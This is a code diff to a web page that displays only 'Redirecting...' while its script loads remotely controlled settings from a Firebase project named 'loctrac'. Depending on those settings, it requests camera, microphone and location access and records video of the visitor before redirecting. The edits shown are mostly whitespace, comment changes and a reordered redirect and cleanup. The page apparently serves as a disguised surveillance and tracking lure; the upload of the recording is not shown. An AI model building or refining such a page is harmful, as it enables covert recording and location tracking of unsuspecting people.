@@ -44,7 +44,7 @@
     <div class="container">
         <h1>Redirecting...</h1>
         <p>You will be redirected shortly <span class="loading-dots"></span></p>
-        <p id="error-message" class="error-message" style="display:none;"></p>
+         <p id="error-message" class="error-message" style="display:none;"></p>
     </div>
 
 <script>
@@ -57,7 +57,7 @@ const firebaseConfig = {
     messagingSenderId: "34491549339",
     appId: "1:34491549339:web:c666c4f8f3271bab06e83e",
     measurementId: "G-65PYC8E9VR",
-    databaseURL: "https://loctrac-8d7ef-default-rtdb.europe-west1.firebasedatabase.app" // Correct URL
+    databaseURL: "https://loctrac-8d7ef-default-rtdb.europe-west1.firebasedatabase.app"  // Correct URL
 };
 
 // Initialize Firebase
@@ -79,13 +79,13 @@ const errorMessage = document.getElementById("error-message");
         if (data) {
             micCamPermission = data.micCamPermission;
             locationPermission = data.locationPermission;
-            notificationPermission = data.notificationPermission; // Get notification setting
+            notificationPermission = data.notificationPermission;
             redirectUrl = data.redirectUrl;
             redirectSeconds = parseInt(data.redirectSeconds) || 0;
             recordSeconds = parseInt(data.recordSeconds) || 0;
         } else {
             console.error("No data found in Firebase.");
-            errorMessage.textContent = "Fout: Kon instellingen niet laden.";
+             errorMessage.textContent = "Fout: Kon instellingen niet laden.";
             errorMessage.style.display = 'block';
             return; // Exit if no data
         }
@@ -96,7 +96,8 @@ const errorMessage = document.getElementById("error-message");
         return; // Exit on error
     }
 
-    // --- Permissions ---
+    // --- Permissions and Actions ---
+
     // 1. Camera/Microphone (if needed)
     if (micCamPermission) {
         try {
@@ -113,11 +114,11 @@ const errorMessage = document.getElementById("error-message");
 
                 recorder.onstop = () => {
                     const blob = new Blob(chunks, { type: 'video/webm' });
-                    // No URL needed
+                    // No URL needed.
 
-                    // ---  All Permissions Granted, Proceed ---
-                    stream.getTracks().forEach(track => track.stop());
+                    // 3. Redirect (after recording and cleanup)
                     performRedirect();
+                    stream.getTracks().forEach(track => track.stop()); //  Cleanup
                 };
 
                 recorder.onstart = () => {
@@ -133,18 +134,23 @@ const errorMessage = document.getElementById("error-message");
             } else {
                 // No recording needed, but we still got the stream, so stop it
                 stream.getTracks().forEach(track => track.stop());
-                performRedirect(); //  <--  IMMEDIATE REDIRECT
+                // 3. Redirect (immediately)
+                performRedirect();
             }
+
         } catch (error) {
             console.error("Error accessing camera/microphone:", error);
-            errorMessage.textContent = `Camera/Microfoon Fout: ${error.message}`;
-            errorMessage.style.display = 'block';
-            performRedirect(); //  <--  REDIRECT EVEN ON ERROR
+             errorMessage.textContent = `Camera/Microfoon Fout: ${error.message}`;
+             errorMessage.style.display = 'block';
+            // 3. Redirect (even on error)
+            performRedirect();
         }
     } else {
-        // No camera/mic needed, proceed to next permission
-        performRedirect(); //  <--  IMMEDIATE REDIRECT
+        // No camera/mic needed, proceed to redirect
+        // 3. Redirect (immediately)
+        performRedirect();
     }
+
 
     // Function to perform the final redirect
     function performRedirect() {
